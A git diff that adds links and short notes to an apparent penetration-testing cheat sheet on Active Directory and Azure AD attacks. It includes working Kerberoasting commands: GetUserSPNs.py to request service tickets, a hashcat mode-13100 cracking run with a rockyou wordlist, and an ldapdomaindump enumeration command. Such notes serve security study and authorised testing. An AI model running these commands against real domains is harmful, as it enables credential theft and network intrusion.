@@ -466,6 +466,15 @@ kerberos:ptt <ticket.kirbi>
 - http://passing-the-hash.blogspot.com/
 
 http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html 
+https://room362.com/post/2017/reset-ad-user-password-with-linux/
+
+https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a
+
+https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a
+  TR19: I'm in your cloud, reading everyone's emails - hacking Azure AD via Active Directory: https://www.youtube.com/watch?v=JEIR5oGCwdg
+  Azure AD Connect for Red Teamers: https://blog.xpnsec.com/azuread-connect-for-redteam/
+  https://github.com/hausec/PowerZure
+
 
 - How Attackers Pull the Active Directory Database (NTDS.dit) from a Domain Controller: https://adsecurity.org/?p=451
 - Attack Methods for Gaining Domain Admin Rights in Active Directory: https://adsecurity.org/?p=2362
@@ -483,3 +492,29 @@ http://blog.liatsisfotis.com/knock-and-pass-kerberos-exploitation.html
 ## KB2871997
 - https://technet.microsoft.com/library/security/2871997
 - Microsoft has definitely raised the bar: accounts that are members of the localgroup “Administrators” are no longer able to execute code with WMI or PSEXEC, use schtasks or at, or even browse the open shares on the target machine. Oh, except (as pwnag3 reports and our experiences confirm) the RID 500 built-in Administrator account, even if it’s renamed.
+
+## Microsoft Windows AD Kerberos Tickets
+
+Gather tickets 
+```
+GetUserSPNs.py -request (HOST.DOMAIN)/(VALID SMB USER):(USER PASSWORD)
+```
+
+Crack
+```
+-a 0 - Straight cracking mode
+-m 13100 - Hashtype 13100 - which is Kerberos 5 TGS-REP etype 23
+the kerberos.ticket file
+-w 3 - Suggested example "workload" setting for Hashcat
+
+.\hashcat64.exe -m 13100 -a 0 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\kerberos.tick
+et' -w 3 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\rockyou.txt'
+hashcat (v5.1.0) starting...
+```
+
+
+## Dump 
+
+```
+ldapdomaindump -u example\example 10.10.10.10
+```
